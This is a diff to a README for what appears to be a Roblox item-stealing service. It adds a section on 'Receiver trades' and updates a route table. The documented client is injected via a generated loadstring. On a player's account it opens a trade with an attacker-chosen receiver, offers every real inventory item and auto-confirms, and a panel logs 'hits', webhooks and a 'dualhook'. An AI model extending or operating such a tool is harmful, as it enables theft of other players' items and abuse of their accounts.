@@ -186,6 +186,25 @@ npx wrangler secret put ACCOUNT_API_KEY
 If the key is missing, the app falls back to local password auth (scrypt on Node,
 PBKDF2 on Workers).
 
+## Receiver trades
+
+Receivers configured on **My script** are injected into the generated client. When one of
+those usernames is in the server, or joins it, the client requests a trade, offers every
+real item from the inventory and confirms its side. Each stage is recorded and shown under
+**Auto joiner → Receiver trades** (`engine`, `receiver_joined`, `request`, `window`,
+`offer`, `confirm`, `waiting`, `done`, `no_window`).
+
+```json
+{ "event": "trade", "stage": "offer", "receiver": "ReceiverOne",
+  "items": ["Chroma Seer"], "game": "mm2", "place_id": 142823291,
+  "server_id": "…", "detail": "1 item(s) via 2 remote(s)" }
+```
+
+Trade events are stored on the user (`trades`, last 60) and never create a hit. The client
+discovers trade, item and confirm remotes by name in `ReplicatedStorage`, so a game without
+those remotes reports `no_window` instead of pretending it traded. The receiver has to
+accept; running the same client on that account auto-confirms its side.
+
 ## Multi-client launcher
 
 `tools/roblox_multi.py` opens several Roblox clients, one per saved account, optionally into
@@ -225,7 +244,7 @@ with `PlaceLauncher.ashx` inside it. Nothing is patched, no client files are tou
 | `/servers` | Reported servers with join links |
 | `/leaderboard` | Rank by tracked value (admin) |
 | `/script` | Loadstring, receivers, webhook, dualhook, min value, API key |
-| `/claimer` | Auto joiner: latest hits, queue, accounts, SSS claimer script |
+| `/claimer` | Auto joiner: latest hits, receiver trades, queue, accounts, SSS claimer script |
 | `/settings` | Profile, password, API key, export/clear |
 | `/admin/members` | Search, ban, promote |
 | `/admin/hits` | Every hit network-wide |
